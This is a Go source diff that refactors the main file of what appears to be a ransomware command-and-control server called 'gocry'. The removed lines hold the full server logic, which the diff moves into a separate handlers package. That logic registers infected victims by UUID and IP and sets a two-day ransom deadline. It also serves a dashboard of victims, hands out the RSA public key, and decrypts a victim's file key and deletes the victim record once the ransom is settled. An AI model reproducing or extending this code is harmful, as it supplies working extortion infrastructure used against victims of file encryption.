@@ -1,204 +1,15 @@
 package main
 
 import (
-	"crypto/rand"
-	"crypto/rsa"
-	"crypto/sha256"
-	"crypto/x509"
-	"encoding/json"
-	"encoding/pem"
-	"fmt"
-	"html/template"
-	"io/ioutil"
 	"log"
 	"net/http"
 	"os"
-	"time"
 
 	"github.com/joho/godotenv"
 	"github.com/nireo/gocry/server/database"
 	"github.com/nireo/gocry/server/gen_rsa"
-	"gorm.io/gorm"
+	"github.com/nireo/gocry/server/handlers"
 )
-
-// DecryptKey takes a RSA encrypted key and then decrypts that key using the private key stored in
-// the server.
-func DecryptKey(w http.ResponseWriter, r *http.Request) {
-	query := r.URL.Query()
-	id, ok := query["id"]
-	if !ok || len(id) == 0 {
-		http.Error(w, "to encrypt key, you need to provide a valid id", http.StatusBadRequest)
-		return
-	}
-
-	key, err := ioutil.ReadAll(r.Body)
-	if err != nil {
-		http.Error(w, "error reading request body", http.StatusInternalServerError)
-		return
-	}
-
-	pemd, err := ioutil.ReadFile("private.pem")
-	if err != nil {
-		http.Error(w, "error reading rsa private key", http.StatusInternalServerError)
-		return
-	}
-
-	// decode the pem data
-	block, _ := pem.Decode(pemd)
-	if block == nil {
-		http.Error(w, "error decoding key data", http.StatusInternalServerError)
-		return
-	}
-
-	// check that the key is of the right type.
-	if got, want := block.Type, "RSA PRIVATE KEY"; got != want {
-		http.Error(w, "unknow key type", http.StatusInternalServerError)
-		return
-	}
-
-	// Decode the RSA private key
-	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
-	if err != nil {
-		http.Error(w, "bad private key", http.StatusInternalServerError)
-		return
-	}
-
-	out, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, key, []byte("key-"+id[0]))
-	if err != nil {
-		http.Error(w, "error with rsa decrypting", http.StatusInternalServerError)
-		return
-	}
-
-	db := database.GetDatabase()
-
-	// since creating the decrypted key was successful we can delete the victim from the database
-	var victim Victim
-	if err := db.Where(&Victim{UUID: id[0]}).First(&victim).Error; err != nil {
-		http.Error(w, "invalid uuid", http.StatusBadRequest)
-		return
-	}
-
-	db.Delete(&victim)
-
-	w.Write(out)
-}
-
-// takes in the starting time of the ransom and adds 2 days to it.
-func getDueDate(timestamp int64) int64 {
-	tm := time.Unix(timestamp, 0)
-	tm.Add(time.Hour * 24 * 2)
-
-	return tm.Unix()
-}
-
-type victimHtmlDisplay struct {
-	Count   int
-	Victims []Victim
-}
-
-// ServeVictimsDisplay returns a simple html page with all the victims and they information.
-func ServeVictimsDisplay(w http.ResponseWriter, r *http.Request) {
-	w.Header().Set("Content-Type", "text/html")
-
-	db := database.GetDatabase()
-
-	var victims []Victim
-	db.Find(&victims)
-
-	htmlDisplay := &victimHtmlDisplay{
-		Count:   len(victims),
-		Victims: victims,
-	}
-
-	tmpl := template.Must(template.ParseFiles("./templates/victims.html"))
-	if err := tmpl.Execute(w, htmlDisplay); err != nil {
-		http.Error(w, fmt.Sprintf("could not execute html template: %s", err), http.StatusInternalServerError)
-		return
-	}
-}
-
-// GetRSAPubKey returns the public key to the user.
-func GetRSAPubKey(w http.ResponseWriter, r *http.Request) {
-	data, err := ioutil.ReadFile("./public.pem")
-	if err != nil {
-		http.Error(w, fmt.Sprintf("could not get rsa public key: %s", err),
-			http.StatusInternalServerError)
-	}
-
-	w.Write(data)
-}
-
-// Victim database model
-type Victim struct {
-	gorm.Model
-	UUID      string `json:"uuid"` // A unique id used to identify the victim
-	IP        string `json:"ip"`
-	Timestamp int64  `json:"timestamp"` // A timestamp of the infection
-	Completed bool   `json:"completed"` // A indicator if the transaction has been payed.
-	DueDate   int64  `json:"due_date"`  // timestamp but with two days added
-}
-
-type newVictim struct {
-	UUID      string `json:"uuid"`
-	IP        string `json:"ip"`
-	Timestamp int64  `json:"timestamp"`
-}
-
-// RegisterNewVictim creates a new victim from a json request
-func RegisterNewVictim(w http.ResponseWriter, r *http.Request) {
-	if r.Method != http.MethodPost {
-		http.Error(w, "bad request", http.StatusBadRequest)
-		return
-	}
-
-	if r.Header.Get("Content-Type") != "application/json" {
-		http.Error(w, fmt.Sprintf("wrong content type, wanted: application/json, got: %s",
-			r.Header.Get("Content-Type")), http.StatusBadRequest)
-		return
-	}
-
-	// parse json data from the request
-	var victimData newVictim
-	if err := json.NewDecoder(r.Body).Decode(&victimData); err != nil {
-		http.Error(w, fmt.Sprintf("could not parse request body json data: %s", err),
-			http.StatusInternalServerError)
-		return
-	}
-
-	// The uuid is created on the client-side, since then the client also easily knows
-	// its own uuid.
-
-	victim := &Victim{
-		UUID:      victimData.UUID,
-		Timestamp: victimData.Timestamp,
-		IP:        victimData.IP,
-		Completed: false,
-		DueDate:   getDueDate(victimData.Timestamp),
-	}
-
-	log.Printf("new victim registered, ID: %s, IP: %s", victim.UUID, victim.IP)
-	db.Create(victim)
-	w.WriteHeader(http.StatusOK)
-}
-
-// GetRansomwareDueDate gets the time in which the user needs to have the ransom ready.
-func GetRansomwareDueDate(w http.ResponseWriter, r *http.Request) {
-	uuid := r.URL.Query().Get("id")
-	if uuid != "" {
-		http.Error(w, "no id query provided", http.StatusBadRequest)
-		return
-	}
-
-	var victim Victim
-	if err := db.Where(&Victim{UUID: uuid}).First(&victim).Error; err != nil {
-		http.Error(w, "victim data not found", http.StatusNotFound)
-		return
-	}
-
-	tm := time.Unix(victim.DueDate, 0)
-
-	w.Write([]byte(tm.String()))
-}
 
 func main() {
 	// Load environment variables, such that we can take database parameters
@@ -212,7 +23,7 @@ func main() {
 	if len(os.Args) == 2 && os.Args[1] == "remove_data" {
 
 		// find all victims and remove their database entries.
-		var victims []Victim
+		var victims []database.Victim
 		db.Find(&victims)
 		for _, victim := range victims {
 			db.Delete(victim)
@@ -232,10 +43,12 @@ func main() {
 	}
 
 	// Define routes
-	http.HandleFunc("/pubkey", GetRSAPubKey)
-	http.HandleFunc("/register", RegisterNewVictim)
-	http.HandleFunc("/dashboard", ServeVictimsDisplay)
-	http.HandleFunc("/due", GetRansomwareDueDate)
+	http.HandleFunc("/pubkey", handlers.GetRSAPubKey)
+	http.HandleFunc("/register", handlers.RegisterNewVictim)
+	http.HandleFunc("/dashboard", handlers.ServeVictimsDisplay)
+	http.HandleFunc("/due", handlers.GetRansomwareDueDate)
+
+	log.Print("server running on port 8080")
 
 	// start the http listener
 	if err := http.ListenAndServe("127.0.0.1:8080", nil); err != nil {
